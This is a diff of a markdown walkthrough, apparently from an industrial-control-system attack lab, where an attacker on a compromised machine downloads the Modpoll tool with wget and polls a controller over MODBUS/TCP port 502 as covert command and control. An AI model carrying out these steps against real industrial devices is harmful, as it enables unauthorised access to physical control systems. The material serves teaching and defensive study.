@@ -6,6 +6,11 @@ The attacker uses a commonly used port (MODBUS/TCP:502) to bypass firewalls and 
 
 The attacker uses the **MODBUS/TCP** protocol, which typically operates on port **502**, to establish Command and Control between the compromised machines. By utilizing this widely-used industrial protocol, the attacker avoids raising suspicion, as MODBUS traffic is considered normal within many industrial control system (ICS) environments.
 
+
+****![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe68s9l88LiLzW58oAIbExkM1PYLvscOAAqFAvHHp6tOLt51MaLQ8FPIz7tMdvKEHOW4l0nL_VB9IUBwj8AA8V_T4d31CiCoXBRMqdYOjUH6Dbb-vHvfuF0mTgx-oDDinR1c7jWYZGhh5tQT27915pN327E?key=ZVE4yllmhIbKOidz4k1V_g)****
+
+**Img 12:** Network scanning in M2, discovery of M3 network and 502 MODBUS TCP port.
+
 1. **Installing Modpoll on Machine M2 (Attack Machine):**
 
 - The attacker installs the **Modpoll** tool on the compromised M2 to interact with MODBUS devices in the network.
@@ -15,15 +20,11 @@ The attacker uses the **MODBUS/TCP** protocol, which typically operates on port 
 ```
 # step 1 install modpoll in M2
 
-wget https\://www\.modbusdriver.com/downloads/modpoll.tgz_tar xzf modpoll.tgz
+wget https://www.modbusdriver.com/downloads/modpoll.zip
 
-export PATH=modpoll/x86\_64-linux-gnu:$PATH
+export PATH=modpoll/x86_64-linux-gnu:$PATH
 
 ```
-
-****![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe68s9l88LiLzW58oAIbExkM1PYLvscOAAqFAvHHp6tOLt51MaLQ8FPIz7tMdvKEHOW4l0nL_VB9IUBwj8AA8V_T4d31CiCoXBRMqdYOjUH6Dbb-vHvfuF0mTgx-oDDinR1c7jWYZGhh5tQT27915pN327E?key=ZVE4yllmhIbKOidz4k1V_g)****
-
-**Img 12:** Network scanning in M2, discovery of M3 network and 502 MODBUS TCP port.
 
 2. **MODBUS Polling on M3 (System Controller) via MODBUS/TCP:**
 
@@ -32,7 +33,7 @@ export PATH=modpoll/x86\_64-linux-gnu:$PATH
 ```
 # step 1 checking machine/system controller states
 # response can take some minutes
-modpoll -m tcp -r 1 -c 4 -t 0 192.168.52.6 # the -c is the number of outputs you want to get, the response of this command can take some seconds to appear |
+modpoll -m tcp -r 1 -c 4 -t 0 192.168.52.6 # the -c is the number of outputs you want to get, the response of this command can take some seconds to appear
 
 ```
 
